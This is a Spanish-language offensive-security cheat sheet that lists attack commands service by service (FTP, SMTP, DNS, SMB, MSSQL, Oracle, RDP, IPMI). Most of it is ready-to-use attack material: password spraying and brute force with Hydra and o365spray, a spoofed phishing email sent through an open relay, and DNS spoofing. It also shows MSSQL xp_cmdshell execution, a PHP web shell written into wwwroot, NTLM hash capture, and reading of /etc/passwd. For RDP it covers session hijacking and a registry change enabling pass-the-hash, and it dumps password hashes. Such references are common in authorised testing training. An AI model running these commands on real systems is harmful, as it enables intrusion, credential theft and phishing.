# Servicios

## Servicios TCP

### FTP  21

#### Vulnerabilidad de inicio de sesión Anonymous

Escaneo mediante scripts nmap

```bash
nmap -sC -sV -p21 10.10.10.10
```

Conectarse al servicio FTP

```bash
ftp anonymous@10.10.10.10
```

Descargar ficheros dentro del servicio

```bash
get fichero
```

Listar documentos dentro del servicio

```bash
ls
```

#### CoreFTP before build 727 - [CVE-2022-22836](https://nvd.nist.gov/vuln/detail/CVE-2022-22836)

{% code overflow="wrap" %}
```bash
curl -k -X PUT -H "Host: <IP>" --basic -u <username>:<password> --data-binary "PoC." --path-as-is https://<IP>/../../../../../../whoops
```
{% endcode %}

### SSH 22

#### Linux conectado al dominio

```bash
ssh <user>@domain.local@10.10.10.10 -p2222
```

#### Auditoria SSH

```bash
git clone https://github.com/jtesta/ssh-audit.git && cd ssh-audit
```

```bash
./ssh-audit.py 10.10.10.10
```

Cambiar metodo de autenticación

```bash
ssh -v user@10.10.10.10 -o PreferredAuthentications=password
```

### Telnet 23

Conectarse al servicio Telnet

```bash
telnet 10.10.10.10
```

Iniciar sesión en Telnet con un usuario especifico

```bash
telnet -l usuario 10.10.10.10
```

### SMTP 25

Nmap&#x20;

```bash
nmap --script=smtp* -p25 -sV 10.10.10.10
```

Metasploit enumeración de usuarios

```bash
use auxiliary/scanner/smtp/smtp_enum
```

#### **Registros MX Correo**

**Identificar servidor de correo**

```bash
host -t MX <dominio.cl>
```

```bash
dig mx <dominio.cl> | grep "MX" | grep -v ";"
```

#### Enumeración de usuarios SMTP local

Utilidades Linux Enumeración de usuarios automática

{% code overflow="wrap" %}
```bash
smtp-user-enum -M <VRFY,EXPN,RCPT> -U file.txt -D domain.local -t 10.10.10.10 -w 20
```
{% endcode %}

Enumerar usuarios mediante **VRFY**

```bash
telnet 10.10.10.10 25
```

```bash
VRFY root
```

Enumerar usuarios mediante **EXPN**

```bash
telnet 10.10.10.10 25
```

```bash
EXPN john
```

Enumerar usuarios mediante **RCPT TO**

```bash
telnet 10.10.10.10 25
```

```bash
MAIL FROM:test@local.com
```

```bash
RCPT TO:julio
```

#### Enumeración de usuarios SMTP Office365

Descargar recurso de enumeración

```bash
https://github.com/0xZDH/o365spray.git
```

Ejecutar viabilidad de exposición en nube office365

```bash
python3 o365spray.py --validate --domain domain.local
```

Enumeración de usuarios

```bash
python3 o365spray.py --enum -U <users.txt> --domain dominio.cl
```

#### Ataques de contraseña <a href="#password-attacks" id="password-attacks"></a>

Hydra para encontrar usuario y contraseñas validos

```bash
hydra -L users.txt -P password.txt -f 10.10.10.10 pop3
```

```
hydra -L users.txt -P password.txt -f 10.10.10.10 imap
```

{% code overflow="wrap" %}
```
hydra -L users.txt -P password.txt -f 10.10.10.10 smtp #user contains format user@domain
```
{% endcode %}

#### Ataque de contraseña Office365

Rociado de contraseña

{% code overflow="wrap" %}
```bash
python3 o365spray.py --spray -U users.txt -P passwords.txt --count 1 --lockout 1 --domain domain.cl
```
{% endcode %}

#### Ataque de retransmisión SMTP

Reconocimiento de retransmisión disponible

```bash
nmap -p25 -Pn --script smtp-open-relay 10.10.10.10
```

Envio de suplantación de correo mediante rele abierto

{% code overflow="wrap" %}
```bash
swaks --from notifications@dominio.cl --to employees@dominio.com --header 'Subject: Company Notification' --body 'Hi All, we want to hear from you! Please complete the following survey. http://mycustomphishinglink.com/' --server 10.10.10.10
```
{% endcode %}

#### Ataque sobre OpenSMTPD

Descarga del exploit disponible

```bash
wget https://www.exploit-db.com/exploits/47984
```

### DNS 53

<table><thead><tr><th width="143.0909423828125">Registro DNS</th><th>Descripción</th></tr></thead><tbody><tr><td>dig A 10.10.10.10</td><td>Como resultado, devuelve una dirección IPv4 del dominio solicitado.</td></tr><tr><td>dig AAAA 10.10.10.10</td><td>Devuelve una dirección IPv6 del dominio solicitado.</td></tr><tr><td>dig MX 10.10.10.10</td><td>Como resultado, devuelve los servidores de correo responsables.</td></tr><tr><td>dig NS 10.10.10.10</td><td>Devuelve los servidores DNS (servidores de nombres) del dominio.</td></tr><tr><td>dig TXT 10.10.10.10</td><td>Este registro puede contener información diversa. El todo TXT se puede utilizar, por ejemplo, para validar Google Search Console o validar certificados SSL. Además, las entradas SPF y DMARC están configuradas para validar el tráfico de correo y protegerlo del spam.</td></tr><tr><td>dig CNAME 10.10.10.10</td><td>Este registro sirve como alias para otro nombre de dominio. Si desea que el www.example.eu de dominio apunte a la misma IP que example.eu, debe crear un registro A para example.eu y un registro CNAME para www.example.eu.</td></tr><tr><td>dig PTR 10.10.10.10</td><td>El registro PTR funciona al revés (búsqueda inversa). Convierte las direcciones IP en nombres de dominio válidos.</td></tr><tr><td>dig SOA 10.10.10.10</td><td>Proporciona información sobre la zona DNS correspondiente y la dirección de correo electrónico del contacto administrativo.</td></tr><tr><td>dig axfr google.com @10.129.14.128</td><td>Transferencia de zona para dicho DNS.</td></tr><tr><td>dig any </td><td>Muestra toda la información disponible</td></tr></tbody></table>

#### Nmap

```bash
nmap -p53 -Pn -sV -sC 10.10.10.10
```

#### CRT

Busqueda de certificados registrados para un dominio

```bash
curl -s "https://crt.sh/?q=<dominio>&output=json" | jq | grep "common" | sort -
```

#### DIG

devuelve una dirección IPv4 del dominio solicitado

```bash
dig A 10.10.10.10
```

Devuelve una dirección IPv6 del dominio solicitado

```bash
dig AAAA 10.10.10.10
```

Devuelve los servidores de correo asociado a un dominio

```bash
dig MX 10.10.10.10
```

Devuelve los servidores DNS del dominio

```bash
dig NS 10.10.10.10
```

Devuelve información de seguridad configurado SPF, DPKIM, DMARC

```bash
dig TXT 10.10.10.10
```

Ver redirecciones de dominios a través de alias

```bash
dig CNAME 10.10.10.10
```

Busqueda inversa de dominios a través de IP

```bash
dig PTR 10.10.10.10
```

Otorga información de la zona DNS

```bash
dig SOA 10.10.10.10
```

Transferencia de zona DNS

```bash
dig axfr google.com @10.129.14.128
```

#### **Enumeración de subdominios**

Subfinder para descubrir subdominios

```bash
./subfinder -d dominio.cl -v 
```

Subbrute para descubrir subdominios

```bash
git clone https://github.com/TheRook/subbrute.git >> /dev/null 2>&1
```

```bash
cd subbrute
```

```bash
echo "ns1.domain.local" > ./resolvers.txt
```

```bash
./subbrute.py domain.local -s ./names.txt -r ./resolvers.txt
```

#### DNSEnum

Fuerza bruta de nombres de servidores DNS

{% code overflow="wrap" %}
```bash
dnsenum --dnsserver 10.10.10.10 --enum -p 0 -s 0 -o subdomains.txt -f /opt/useful/seclists/Discovery/DNS/subdomains-top1million-110000.txt google.com
```
{% endcode %}

Fuerza bruta de subdominios + transferencia de zona DNS

{% code overflow="wrap" %}
```bash
dnsenum --enum google.com -f /opt/useful/seclists/Discovery/DNS/subdomains-top1million-110000.txt -r
```
{% endcode %}

#### **Busqueda de Transferencia de Zona**

Reconocimiento de transferencias de zonas disponibles

```bash
fierce --domain domail.local
```

#### **Transferencia de zona DIG - AXFR**

Efectuar transferencia de zona

```bash
dig AXFR ns1.domain.local @<ip-or-domain.local>
```

#### Suplantación de DNS <a href="#dns-spoofing" id="dns-spoofing"></a>

Ataque de envenenamiento de caché DNS local

```
dominio-suplantado.com      A   <ip.atacante>
*.dominio-suplantado.com    A   <ip.atacante>
```

A continuación, inicie la `Ettercap` y busque hosts activos en la red navegando a `Hosts > Scan for Hosts`. Una vez completado, agregue la dirección IP de destino (p. ej., `192.168.152.129`) a Target1 y una IP de puerta de enlace predeterminada (p. ej., `192.168.152.2`) a Target2.

Activa `dns_spoof` navegando a `Plugins > Manage Plugins`. Esto envía al equipo objetivo respuestas DNS falsas que se resolverán `dominio-suplantado.com` en la dirección IP `<ip.atacante>.`

Después de un ataque de suplantación de DNS exitoso, si un usuario víctima que proviene de la máquina de destino `192.168.152.129` visita el `idominio-suplantado.com` dominio en un navegador web, será redirigido a un `Fake page` alojado en la dirección IP `<ip.atacante>.`

Además, un ping procedente de la dirección IP de destino `192.168.152.129` a `dominio-supantado.com` debería resolverse de la siguiente manera `<ip.atacante>.`

### &#x20;POP3 110

#### Conectarse al cliente

Proporcionar usuario y contraseña de correo electrónico

```bash
curl -k 'pop3://10.10.10.10' --user '<user@domain.local>:<password>'
```

Descargar correos electrónicos existentes mediante ID

```bash
curl -k 'pop3://10.10.10.10/<id1>' --user '<user@domain.local>:<password>'
```

#### Enumeración de usuarios

Enumerar usuarios mediante **USER**

```bash
USER julio
```

### RPC 139

#### Sesión Nula

Conectarse al protocolo

```
rpcclient -U'%' 10.10.110.17
```

### RSYNC 873

Sondear el servicio

```bash
nc -nv 127.0.0.1 873
```

Conectarse al servicio

```bash
rsync -av --list-only rsync://10.10.10.10/ruta
```

Redirección de recursos

```bash
rsync -av rsync://10.10.10.10/ruta -e "ssh -p2222"
```

### R-Services 1512 - 1514

Inciar sesión rlogin

```bash
rlogin 10.10.10.10 -l user
```

Enumerar directorio

```bash
rwho
```

Listado de usuarios autenticados

```bash
rusers -al 10.10.10.10
```

### NFS 111 / 2049

Ver rutas montables disponibles

```bash
showmount -e 10.10.10.10
```

Crear ruta para montar el recurso disponible

```bash
mkdir nfs-directory
```

Montar ruta disponible en directorio creado

```bash
mount -t nfs 10.10.10.10:/ ./nfs-directory/ -o nolock
```

### IMAP / POP3 143

Conectar a IMAP

```bash
openssl s_client -connect 10.10.10.10:imaps
```

<table><thead><tr><th width="321.25390625">Comando</th><th>Descripción</th></tr></thead><tbody><tr><td><code>1 LOGIN username password</code></td><td>Inicio de sesión del usuario.</td></tr><tr><td><code>1 LIST "" *</code></td><td>Enumera todos los directorios.</td></tr><tr><td><code>1 SELECT INBOX</code></td><td>Selecciona un buzón para que se pueda tener acceso a los mensajes del buzón.</td></tr><tr><td><code>1 FETCH 1 BODY[]</code></td><td>Recupera los datos asociados a un mensaje en el buzón.</td></tr><tr><td><code>1 CREATE "INBOX"</code></td><td>Crea un buzón con un nombre especificado.</td></tr><tr><td><code>1 DELETE "INBOX"</code></td><td>Elimina un buzón.</td></tr><tr><td><code>1 RENAME "ToRead" "Important"</code></td><td>Cambia el nombre de un buzón.</td></tr><tr><td><code>1 LSUB "" *</code></td><td>Devuelve un subconjunto de nombres del conjunto de nombres que el usuario ha declarado como o .<code>activesubscribed</code></td></tr><tr><td><code>1 UNSELECT INBOX</code></td><td>Sale del buzón seleccionado.</td></tr><tr><td><code>1 CLOSE</code></td><td>Elimina todos los mensajes con el indicador establecido.<code>Deleted</code></td></tr><tr><td><code>1 LOGOUT</code></td><td>Cierra la conexión con el servidor IMAP.</td></tr></tbody></table>

Conectarse a POP3

```bash
openssl s_client -connect 10.10.10.10:pop3s
```

<table><thead><tr><th width="320.49609375">Comando</th><th>Descripción</th></tr></thead><tbody><tr><td><code>USER username</code></td><td>Identifica al usuario.</td></tr><tr><td><code>PASS password</code></td><td>Autenticación del usuario mediante su contraseña.</td></tr><tr><td><code>STAT</code></td><td>Solicita el número de correos electrónicos guardados del servidor.</td></tr><tr><td><code>LIST</code></td><td>Solicita al servidor el número y el tamaño de todos los correos electrónicos.</td></tr><tr><td><code>RETR id</code></td><td>Solicita al servidor que entregue el correo electrónico solicitado por ID.</td></tr><tr><td><code>DELE id</code></td><td>Solicita al servidor que elimine el correo electrónico solicitado por ID.</td></tr><tr><td><code>CAPA</code></td><td>Solicita al servidor que muestre las capacidades del servidor.</td></tr><tr><td><code>RSET</code></td><td>Solicita al servidor que restablezca la información transmitida.</td></tr><tr><td><code>QUIT</code></td><td>Cierra la conexión con el servidor POP3.</td></tr></tbody></table>

Interceptar conexión

```
curl -k 'imaps://10.10.10.10' --user user:pass -v
```

### SNMP 161

Busqueda de comunidad

```bash
nesixtyone -c /usr/share/seclists/Discovery/SNMP/snmp.txt 10.10.10.10
```

Rastreo de snmp

```bash
snmpwalk -v2c -c public 10.10.10.10
```

### SMB 445

#### Nmap

```bash
sudo nmap 10.10.10.10 -sV -sC -p139,445
```

#### Identificar Dominio

```bash
netexec smb 10.10.10.10 -u '' -p '' --generate-hosts-file host
```

#### Autenticación anónima

```bash
netexec smb 10.10.10.10 -u '' -p '' --shares
```

#### Identificación de Permisos Sobre Recursos

```bash
netexec smb 10.10.10.10 -u '<user>' -p '<password>' --shares
```

#### Auditoria Mediante Enum4linux

```bash
./enum4linux-ng.py 10.10.10.10 -A -C
```

#### Fuerza Bruta

{% code overflow="wrap" %}
```bash
crackmapexec smb 10.10.10.10 -u <diccionario> -p <diccionario> --local-auth (opción si no es cuenta de dominio) --continue-on-success
```
{% endcode %}

#### Funcionamiento

Listar los recursos del repositorio

```bash
smbclient -L //10.10.10.10 -U user
```

Conectarse al repositorio

{% code overflow="wrap" %}
```bash
smbclient //10.10.10.10/<recurso> -U <user> --password=<password> --option='client min protocol=SMB3'
```
{% endcode %}

Enumerar el servicio sin un usuario disponible

```bash
smbclient -L //10.10.10.10 -N --option='client min protocol=SMB3'
```

Conectarse a un recurso sin usuario especifico

```bash
smbclient //10.10.10.10/<recurso> -N --option='client min protocol=SMB3'
```

Conectarse a un recurso disponible

```bash
smbclient -U <usuario> //10.10.10.10/carpeta
```

Enumerar información del servicio

```bash
crackmapexec smb 10.10.10.10
```

Enumerar usuarios dentro del recurso

```bash
crackmapexec smb 10.10.10.10 -u '' -p '' --users
```

Verificar las politicas del recurso compartido

```bash
crackmapexec smb 10.10.10.10 -u '' -p '' --pass-pol
```

Listar recursos como usuario invitado

```bash
crackmapexec smb 10.10.10.10 -u guest -p '' --shares
```

#### SMBGhost Vulnerabilidad

Ataque de desbordamiento de buffer en windows 10

{% code overflow="wrap" %}
```
https://arista.my.site.com/AristaCommunity/s/article/SMBGhost-Wormable-Vulnerability-Analysis-CVE-2020-0796
```
{% endcode %}

### MSSQL  1433 - 1434

#### Nmap

```bash
nmap -Pn -sV -sC -p1433 10.10.10.10
```

#### Funcionamiento

Conectarse al servidor MSSQL

```bash
impacket-mssqlclient <user>@10.10.10.10
```

Conectarse mediante autenticación de windows

```bash
impacket-mssqlclient <user>@10.10.10.10 -windows-auth
```

Mostrar todas las bases de datos

```bash
select name from sys.databases;
```

Seleccionar una de las bases de datos existentes

```bash
use <database>;
```

Mostrar todas las tablas disponibles en la base de datos seleccionada

```bash
select name from sys.tables;
```

Mostrar los datos de la tabla seleccionada

```bash
select * from <table>;
```

Conectarse con sqsh

```bash
sqsh -S 10.10.10.10 -U <user> -P '<password>' -h
```

#### Vulnerabilidad **Ejecución de Comandos**

Habilitar funcionalidad

```bash
-- To allow advanced options to be changed.  
EXECUTE sp_configure 'show advanced options', 1
GO

-- To update the currently configured value for advanced options.  
RECONFIGURE
GO  

-- To enable the feature.  
EXECUTE sp_configure 'xp_cmdshell', 1
GO  

-- To update the currently configured value for this feature.  
RECONFIGURE
GO

```

Ejecución de comandos en SO mediante sql

```bash
xp_cmdshell 'whoami'
```

```bash
GO
```

#### Vulnerabilidad Creación de Archivos

Validar funcionalidad se encuentre en modo blank

```bash
show variables like "secure_file_priv";
```

[Procedimientos de automatización Ole](https://docs.microsoft.com/en-us/sql/database-engine/configure-windows/ole-automation-procedures-server-configuration-option)&#x20;

```bash
> sp_configure 'show advanced options', 1
> GO
> RECONFIGURE
> GO
> sp_configure 'Ole Automation Procedures', 1
> GO
> RECONFIGURE
> GO
```

Crear archivo

{% code overflow="wrap" %}
```bash
> DECLARE @OLE INT
> DECLARE @FileID INT
> EXECUTE sp_OACreate 'Scripting.FileSystemObject', @OLE OUT
> EXECUTE sp_OAMethod @OLE, 'OpenTextFile', @FileID OUT, 'c:\inetpub\wwwroot\webshell.php', 8, 1
> EXECUTE sp_OAMethod @FileID, 'WriteLine', Null, '<?php echo shell_exec($_GET["c"]);?>'
> EXECUTE sp_OADestroy @FileID
> EXECUTE sp_OADestroy @OLE
> GO
```
{% endcode %}

#### Vulnerabilidad Lectura de Archivos

Leer archivos temporales

{% code overflow="wrap" %}
```bash
> SELECT * FROM OPENROWSET(BULK N'C:/Windows/System32/drivers/etc/hosts', SINGLE_CLOB) AS Contents
> GO
```
{% endcode %}

```bash
select LOAD_FILE("/etc/passwd");
```

#### Vulnerabilidad Captura de Hash

Servidor a la escucha del hash

```bash
sudo responder -I tun0
```

Versión alternativa servidor a la escucha del hash

```bash
sudo impacket-smbserver share ./ -smb2support
```

Conexión a servidor SMB

```bash
EXEC master..xp_dirtree '\\10.10.10.10\share\'
```

```bash
GO
```

```bash
EXEC master..xp_subdirs '\\10.10.110.17\share\'
```

```bash
GO
```

#### Suplantación de Usuario

Identificación de usuarios con suplantación disponible

```bash
> SELECT distinct b.name
> FROM sys.server_permissions a
> INNER JOIN sys.server_principals b
> ON a.grantor_principal_id = b.principal_id
> WHERE a.permission_name = 'IMPERSONATE'
> GO
```

Cambiar cuenta de usuario

```bash
> EXECUTE AS LOGIN = 'sa'
> SELECT SYSTEM_USER
> SELECT IS_SRVROLEMEMBER('sysadmin')
> GO
```

Verificar rol de administrador

```bash
SELECT SYSTEM_USER
```

```bash
SELECT IS_SRVROLEMEMBER('sysadmin')
```

```bash
GO
```

#### Bases de Datos Compartidas

Identificar sistemas compartidos

```bash
SELECT srvname, isremote FROM sysservers
```

```bash
GO
```

Identificar usuario del sistema compartido

{% code overflow="wrap" %}
```bash
EXECUTE('select @@servername, @@version, system_user, is_srvrolemember(''sysadmin'')') AT [10.0.0.12\SQLEXPRESS]
```
{% endcode %}

```bash
GO
```

### Oracle TNS 1521

Oracle-Tools-setup.sh

{% code overflow="wrap" %}
```bash
#!/bin/bash

sudo apt-get install libaio1 python3-dev alien -y
git clone https://github.com/quentinhardy/odat.git
cd odat/
git submodule init
git submodule update
wget https://download.oracle.com/otn_software/linux/instantclient/2112000/instantclient-basic-linux.x64-21.12.0.0.0dbru.zip
unzip instantclient-basic-linux.x64-21.12.0.0.0dbru.zip
wget https://download.oracle.com/otn_software/linux/instantclient/2112000/instantclient-sqlplus-linux.x64-21.12.0.0.0dbru.zip
unzip instantclient-sqlplus-linux.x64-21.12.0.0.0dbru.zip
export LD_LIBRARY_PATH=instantclient_21_12:$LD_LIBRARY_PATH
export PATH=$LD_LIBRARY_PATH:$PATH
pip3 install cx_Oracle
sudo apt-get install python3-scapy -y
sudo pip3 install colorlog termcolor passlib python-libnmap
sudo apt-get install build-essential libgmp-dev -y
pip3 install pycryptodome
```
{% endcode %}

```bash
./odat.py -h
```

Conectarse a base de datos

```bash
sqlplus user/password@10.10.10.10/<sid>
```

Visualizar privilegios

```bash
select * from user_role_privs;
```

Conexión con privilegios

```bash
sqlplus user/password@10.10.10.10/<sid> as sysdba
```

Obtener hash de contraseñas

```bash
select name, password from sys.user$;
```

### MySQL 3306

Conectarse al servidor MySQL

```bash
mysql -u <user> -p <password> -h 10.10.10.10
```

Comandos MySQL

| Comando                                              | Descripción                                                            |
| ---------------------------------------------------- | ---------------------------------------------------------------------- |
| `show databases;`                                    | Mostrar todas las bases de datos.                                      |
| `use <database>;`                                    | Seleccione una de las bases de datos existentes.                       |
| `show tables;`                                       | Mostrar todas las tablas disponibles en la base de datos seleccionada. |
| `show columns from <table>;`                         | Mostrar todas las columnas de la tabla seleccionada.                   |
| `select * from <table>;`                             | Mostrar todo en la tabla deseada.                                      |
| `select * from <table> where <column> = "<string>";` | Busca lo necesario `string`en la tabla deseada.                        |

### RDP 3389

#### Nmap

Reconocimiento de los puertos

```bash
nmap -Pn -p3389 10.10.10.10 
```

#### Auditoria

Auditar seguridad en rdp

```bash
git clone https://github.com/CiscoCXSecurity/rdp-sec-check.git && cd rdp-sec-check
```

```bash
./rdp-sec-check.pl 10.10.10.10
```

#### Funcionamiento

Conectarse al servicio rdp

```bash
xfreerdp /u:user /p:"password" /v:10.10.10.10 /size:1920x1080
```

#### Enumeración de Usuarios

Búsqueda de usuarios activos en cmd dentro de la maquina windows

```cmd
query user
```

#### Suplantar Sesión (Tope Windows 2019)

Crear  servicio de windows

{% code overflow="wrap" %}
```bash
sc.exe create <nombre.sesion> binpath= "cmd.exe /k tscon <TARGET_SESSION_ID> /dest:<OUR_SESSION_NAME>tcp#13"
```
{% endcode %}

Iniciar servicio

```powershell
net start sessionhijack
```

#### Vulnerabilidad Pass The Hash

Permitir conexión mediante hash

{% code overflow="wrap" %}
```powershell
reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
```
{% endcode %}

Conectarse mediante hash

```
xfreerdp /v:10.10.10.10 /u:<user> /pth:300FF5E89EF33F83A8146C10F5AB9BB9
```

#### Vulnerabilidad Blue Keep RCE

Explotación con metasploit

```bash
use exploit/windows/rdp/cve_2019_0708_bluekeep_rce
```

### WinRM 5985 / 5986

Conectarse al servicio

```bash
evil-winrm -i 10.10.10.10 -u user -p password
```

### WMI 135

Conectarse al servicio

{% code overflow="wrap" %}
```bash
/usr/share/doc/python3-impacket/examples/wmiexec.py user:"password"@10.10.10.10 "hostname"
```
{% endcode %}

## Servicios UDP

### IPMI 623&#x20;

Obtener hash

```bash
use auxiliary/scanner/ipmi/ipmi_dumphashes 
```

Crackear contraseña

```bash
hashcat -m 7300 hash.txt -a 0 /usr/share/wordlists/rockyou.txt --username
```

Ver contraseña crackeada

```bash
hashcat -m 7300 hash.txt -a 0 /usr/share/wordlists/rockyou.txt --show --username
```
